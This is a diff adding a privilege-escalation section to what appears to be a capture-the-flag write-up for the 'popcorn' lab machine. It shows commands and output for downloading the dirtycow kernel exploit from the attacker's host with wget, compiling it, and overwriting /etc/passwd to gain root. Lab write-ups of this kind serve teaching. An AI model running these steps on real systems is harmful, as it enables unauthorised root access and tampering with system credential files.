@@ -165,6 +165,59 @@ bingo we got a reverse shell...
 
 ## Privilege Escalation 
 
+```
+www-data@popcorn:/tmp$ uname -a
+Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
+www-data@popcorn:/tmp$
+```
+checking the kernel version, we can see it is running an old version of ubuntu. let's try out `dirtycow` exploit.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1f4edaae-ae09-45bb-87d7-8679cdb711c1)
+
+found an exploit using searchsploit. let's send it to the target and compile it.
+
+```
+www-data@popcorn:/tmp$ wget http://10.10.14.14/40839.c
+--2023-05-18 22:14:33--  http://10.10.14.14/40839.c
+Connecting to 10.10.14.14:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4814 (4.7K) [text/x-csrc]
+Saving to: `40839.c'
+
+100%[==============================================================================================>] 4,814       --.-K/s   in 0.008s  
+
+2023-05-18 22:14:33 (604 KB/s) - `40839.c' saved [4814/4814]
+
+www-data@popcorn:/tmp$ gcc -pthread 40839.c dirty -lcrypt
+gcc: dirty: No such file or directory
+www-data@popcorn:/tmp$ gcc -pthread 40839.c -o dirty -lcrypt
+www-data@popcorn:/tmp$ ls -al dirty 
+-rwxr-xr-x 1 www-data www-data 13603 May 18 22:15 dirty
+www-data@popcorn:/tmp$ 
+```
+send the exploit to the target and compiled it. now let's run the exploit.
+
+```
+www-data@popcorn:/tmp$ ./dirty 
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: 
+Complete line:
+firefart:fiOEyJZz3b5lA:0:0:pwned:/root:/bin/bash
+
+mmap: b787c000
+
+^C
+www-data@popcorn:/tmp$ su firefart
+Password: 
+firefart@popcorn:/tmp# id
+uid=0(firefart) gid=0(root) groups=0(root)
+firefart@popcorn:/tmp# 
+```
+ran the exploit, it creates a backup file for `/etc/passwd` and modify the current one by creating a user `firefart` request a password we can use to login and giving it the sudo group privilege. abd Bull's eye got root.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/fb134dd8-a64e-4139-9fe4-6626e5c0d801)
+
+hand we are through... Had fun yeah? 😉
 
 
 
